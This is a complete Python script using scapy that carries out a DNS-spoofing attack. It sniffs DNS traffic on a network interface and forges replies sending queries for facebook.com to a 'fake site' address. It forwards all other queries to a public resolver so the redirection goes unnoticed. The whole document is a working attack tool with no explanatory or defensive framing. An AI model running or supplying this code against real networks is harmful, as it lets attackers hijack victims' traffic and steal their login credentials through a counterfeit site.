!/usr/bin/env python3
from scapy.all import *
import socket

TARGET_DOMAIN = b"facebook.com."
FAKE_IP = "192.168.107.134"  # IP of your fake site

def forward_dns_request(packet):
    """Forward DNS request to a real DNS server (Google's 8.8.8.8)"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(bytes(packet[DNS]), ("8.8.8.8", 53))
    resp_data, _ = sock.recvfrom(1024)
    sock.close()
    return DNS(resp_data)

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing {qname.decode()} to {FAKE_IP}")
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=10, rdata=FAKE_IP))
            send(spoofed_pkt, verbose=0)
        else:
            # Forward to real DNS
            print(f"[+] Forwarding {qname.decode()}")
            real_resp = forward_dns_request(packet)
            real_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=53) / real_resp
            send(real_pkt, verbose=0)

sniff(filter="udp port 53", prn=dns_spoof, store=0,iface="eth1")
